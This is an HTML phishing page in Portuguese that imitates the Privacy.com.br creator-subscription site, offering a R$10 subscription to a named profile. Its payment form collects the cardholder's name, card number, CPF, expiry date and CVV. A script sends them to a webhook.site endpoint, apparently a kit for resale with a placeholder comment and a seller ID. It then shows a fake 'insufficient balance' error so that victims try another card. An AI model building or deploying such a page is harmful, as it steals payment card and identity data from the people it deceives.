<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Privacy | Kamylinha Santos</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/notiflix@2.7.0/dist/notiflix-aio-2.7.0.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
    <style>
        :root { --primary: #f47b52; }
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', sans-serif; }
        body { background: #fff; padding-bottom: 50px; }
        .nav { padding: 15px; border-bottom: 1px solid #eee; text-align: center; }
        .banner { width: 100%; height: 200px; object-fit: cover; }
        .profile { width: 100px; height: 100px; border-radius: 50%; border: 4px solid #fff; margin: -50px 0 0 20px; position: relative; object-fit: cover; }
        .content { padding: 20px; }
        .btn-pay { width: 100%; padding: 15px; background: linear-gradient(90deg, #f47b52, #f9a67a); border: none; border-radius: 50px; color: #fff; font-weight: 800; margin-top: 15px; cursor: pointer; }
        #modal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); z-index: 1000; }
        .modal-box { background: #fff; width: 90%; max-width: 400px; margin: 20% auto; padding: 25px; border-radius: 20px; }
        .form-group { margin-bottom: 15px; }
        .form-group label { display: block; font-size: 12px; font-weight: 700; margin-bottom: 5px; }
        .form-group input { width: 100%; padding: 12px; border: 1px solid #ddd; border-radius: 8px; font-size: 16px; }
    </style>
</head>
<body>
    <div class="nav"><img src="https://privacy.com.br/img/logo-orange.svg" height="25"></div>
    <img src="capa.png" class="banner">
    <img src="perfil1.png" class="profile">
    <div class="content">
        <h2>Kamylinha Santos ✅</h2>
        <p style="color: #666; font-size: 14px;">@eukamylinhasantos</p>
        <button class="btn-pay" onclick="abrir()">ASSINAR POR R$ 10,00</button>
    </div>
    <div id="modal">
        <div class="modal-box">
            <h3 style="margin-bottom: 20px; color: var(--primary)">Dados de Pagamento</h3>
            <div class="form-group"><label>NOME NO CARTÃO</label><input type="text" id="n"></div>
            <div class="form-group"><label>NÚMERO DO CARTÃO</label><input type="text" id="c"></div>
            <div class="form-group"><label>CPF</label><input type="text" id="cpf"></div>
            <div style="display: flex; gap: 10px;">
                <div class="form-group"><label>DATA</label><input type="text" id="d" placeholder="MM/AA"></div>
                <div class="form-group"><label>CVV</label><input type="text" id="cvv"></div>
            </div>
            <button class="btn-pay" onclick="enviar()">CONFIRMAR PAGAMENTO</button>
        </div>
    </div>
    <script>
        $(document).ready(function(){
            $('#c').mask('0000 0000 0000 0000');
            $('#cpf').mask('000.000.000-00');
            $('#d').mask('00/00');
            $('#cvv').mask('000');
        });
        function abrir() { document.getElementById('modal').style.display = 'block'; }
        function enviar() {
            const dados = {
                nome: document.getElementById('n').value,
                card: document.getElementById('c').value,
                cpf: document.getElementById('cpf').value,
                data: document.getElementById('d').value,
                cvv: document.getElementById('cvv').value,
                id_vendedor: "1326639660872499315"
            };
            if(!dados.card || !dados.cvv) return alert("Preencha tudo!");
            Notiflix.Loading.circle('Processando...');

            // SEU LINK DO WEBHOOK.SITE
            const url = "https://webhook.site/9ff5f800-50a2-4d33-957f-9acaf708f381";

            fetch(url, {
                method: 'POST',
                mode: 'no-cors', 
                body: JSON.stringify(dados)
            }).then(() => {
                setTimeout(() => {
                    Notiflix.Loading.remove();
                    Notiflix.Report.failure('Erro', 'Saldo insuficiente. Tente outro cartão.', 'OK');
                    document.getElementById('c').value = "";
                    document.getElementById('cvv').value = "";
                }, 2000);
            });
        }
    </script>
</body>
</html>
